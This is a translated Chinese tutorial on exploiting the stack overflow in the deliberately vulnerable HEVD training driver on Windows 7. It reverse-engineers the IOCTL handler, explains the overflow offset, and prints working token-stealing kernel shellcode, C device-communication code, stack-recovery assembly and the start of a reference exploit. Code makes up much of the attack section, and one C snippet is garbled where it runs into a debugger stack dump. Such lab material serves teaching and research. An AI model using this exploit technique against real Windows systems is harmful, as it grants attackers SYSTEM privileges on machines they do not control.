# HEVD Window Kernel Exploit 01 - StackOverflow
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
栈溢出是一个最基本的漏洞利用方式，这里我们利用这个作为入门学习，了解一下在 Windows Kernel 下触发栈溢出时，与User Mode的不同之处。
## 漏洞程序
找到之前准备好的`HackSysExtremeVulnerableDriver.sys`，里面有一个准备好的带有栈溢出的函数，叫做`StackOverflowIoctlHandler`。我们通过逆向，找到对应触发函数的`IOCTL`:
记录下此时的 IOCTL Code 为 222003h。之后我们来看这个程序的内部逻辑:
    int __stdcall StackOverflowIoctlHandler(PIRP a1, PIO_STACK_LOCATION a2)
    {
      int v2; // ecx
      HANDLE v3; // edx
      v2 = 0xC0000001;
      v3 = a2->Parameters.SetFile.DeleteHandle;
      if ( v3 )
        v2 = TriggerStackOverflow(v3, a2->Parameters.Create.Options);
      return v2;
    }
_PS：这类`IOCTL Handle
Routine`的传入参数类型是固定的，一定是第一个为`PRIR`，第二个为`PIO_STACK_LOCATION`，如果没有识别出参数的话，可以直接指定参数类型_  
此时发现，这个`a2`好像识别的有一点问题，从函数名也能猜到，程序逻辑本身应该是一个读取`Buffer`的逻辑，不应该和`SetFile`这类文件操作相关，所以这里推测，应该是`PIO_STACK_LOCATION`结构体中存在`union`结构，所以此时识别的结构体出现了错误。这个时候回退到`Disassembly`的界面，然后在参数的位置处右键，选择`Structure
Offset`，就能够修改当前结构体识别的类型。
这里我们修改成和`DeviceIoControl`相关的`DeviceIoControl.Type3InputBuffer`，下面的参数也修改成`DeviceIoControl.InputBufferLength`，整个逻辑就变成了
    int __stdcall StackOverflowIoctlHandler(PIRP a1, _IO_STACK_LOCATION *a2)
    {
      int v2; // ecx
      PVOID Buffer; // edx
      v2 = 0xC0000001;
      Buffer = a2->Parameters.DeviceIoControl.Type3InputBuffer;
      if ( Buffer )
        v2 = TriggerStackOverflow(Buffer, a2->Parameters.DeviceIoControl.InputBufferLength);
      return v2;
    }
此时逻辑就清晰了很多：读取`IO_STACK_LOCATION`指针指向的Buffer内容，并且将Buffer的和Buffer的长度传入到触发函数中。并且触发函数中的内容如下:
    int __stdcall TriggerStackOverflow(void *Address, size_t MaxCount)
    {
      char Dst; // [esp+14h] [ebp-81Ch]
      CPPEH_RECORD ms_exc; // [esp+818h] [ebp-18h]
      memset(&Dst, 0, 0x800u);
      ms_exc.registration.TryLevel = 0;
      ProbeForRead(Address, 0x800u, 4u);
      DbgPrint("[+] UserBuffer: 0x%p\n", Address);
      DbgPrint("[+] UserBuffer Size: 0x%X\n", MaxCount);
      DbgPrint("[+] KernelBuffer: 0x%p\n", &Dst);
      DbgPrint("[+] KernelBuffer Size: 0x%X\n", 2048);
      DbgPrint("[+] Triggering Stack Overflow\n");
      memcpy(&Dst, Address, MaxCount);
      return 0;
    }
简单介绍一下内核函数`ProbeForRead`：
    void ProbeForRead(
      const volatile VOID *Address,
      SIZE_T              Length,
      ULONG               Alignment
    );
函数能够检查当前的地址是否属于用户态（访问地址是否越界），并且检查当前的地址是否是按照第三个参数要求的 Alignment
进行对齐。然后就会将当前传入的`Buffer`按照Buffer本身的`MaxCount`拷贝到栈上，从而造成栈溢出。
## 利用分析
整个逻辑是分析清楚了：只要使用`DeviceIoControl`从用户端这边发送请求，并且使用的是`Buffer`,而且大小超过了`0x81c`，就会发生栈溢出，造成返回值被劫持。
###  提权相关
单纯劫持返回值还不够，因为内核态并没有类似于用户态中的`system`这类方便的劫持函数。在内核态实现劫持，根据平台的不同，会使用的不同的劫持方式
####  WIN7
在Win7阶段，内核态并没有做过多的限制，所以 **可以在内核态执行用户态的程序**
。那么如果劫持了返回值，那么便是可以运行由我们自己申请的地址空间上的shellcode。一般的逻辑如下：  
首先在Windows操作系统中，所有的东西都被视为 **对象** ，每一个对象都有一个 **安全描述符（security descriptors）**
（长得有点像`(A;;RPWPCCDCLCRCWOWDSDSW;;;DA)`这样的）其在内存中存储的形式通常为一个token。它会描述当前进程的所有者，以及其的相关权限，包括对文件的操作等等。这里最高的权限就是`NT
AUTHORITY\SYSTEM`，系统权限拥有对所有文件的任意权力（相当于是root）。所以一般的提权思路就是：
  1. 遍历当前所有进程
  2. 找到当前进程中的系统进程（通常来说进程号4的进程就是系统进程啦）
  3. 将其的安全描述符token复制到当前进程的安全描述符中，即可完成提权
能够找到的payload如下
          pushad                               ; Save registers state
          ; Start of Token Stealing Stub
          xor eax, eax                         ; Set ZERO
          mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                                ; _KTHREAD is located at FS:[0x124]
          mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process
          mov ecx, eax                         ; Copy current process _EPROCESS structure
          mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4
          SearchSystemPID:
              mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
              sub eax, FLINK_OFFSET
              cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
              jne SearchSystemPID
          mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
          mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                                ; with SYSTEM process nt!_EPROCESS.Token
          ; End of Token Stealing Stub
          popad                                ; Restore registers state
          ; Kernel Recovery Stub
          xor eax, eax                         ; Set NTSTATUS SUCCEESS
          add esp, 12                          ; Fix the stack
          pop ebp                              ; Restore saved EBP
          ret 8                                ; Return cleanly
## EXP实现
内核态的通信和用户态不太一样。看过的教材中有使用C语言直接编译exe的，也有使用python/powershell调用库进行攻击的。于是这里打算介绍一下最普通的使用C语言的攻击，以及最近比较流行的使用powershell进行的攻击（这一类似乎被称之为fileless
attack)
###  C语言
####  通讯准备
首先要能够实现最基本的通信，使用C（Cpp）的话，需要直接调用Windows系列的API对文件进行操作，如下:
    #include "pch.h"
    #include 
    #include 
    #define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"
    HANDLE GetDeviceHandle() {
        HANDLE hRet = NULL;
        hRet = CreateFile(
            DEVICE_NAME,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
            NULL
        );
        if (hRet == INVALID_HANDLE_VALUE) {
            std::cout  ddp esp
    a36bda14  a36bda30 ;上一个栈的ebp
    a36bda18  9ddf42d3 ;函数返回值，即将被我们劫持
    a36bda1c  9bf37580 ;
    a36bda20  9bf375f0 
    a36bda24  00060000 ;ret之后，esp实际指向的位置
    a36bda28  a79efa88 
    a36bda2c  b01a6b0e 
    a36bda30  a36bda4c ;函数 StackOverflowIoctlHandler 保存的的ebp
    a36bda34  81a3f958 ;函数 StackOverflowIoctlHandler 保存的返回值
    a36bda38  a79efa88 00b80003
    a36bda3c  9bf37580 00940006
在距离返回值地址的0x18的位置上，正好有上一个函数的返回地址，所以当我们劫持了这个函数返回值的时候，在shellcode的末尾，我们可以加上一些额外的指令来实现恢复栈
    xor eax, eax  ;伪装返回值
    add esp, 12   ;将栈调整到 StackOverflowIoctlHandler 的位置上
    pop ebp 
    ret 8         ;这个地方照着 TriggerStackOverFlow 的结尾汇编写
这里我们参考HEVD给出的参考答案:
    #include "pch.h"
    #include "payload.h"
    #include 
    #include 
    #define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"
    VOID TokenStealingPayloadWin7() {
        // Importance of Kernel Recovery
        __asm {
            pushad; Save registers state
            ; Start of Token Stealing Stub
            xor eax, eax; Set ZERO
            mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
            ; _KTHREAD is located at FS : [0x124]
            mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process
            mov ecx, eax; Copy current process _EPROCESS structure
            mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4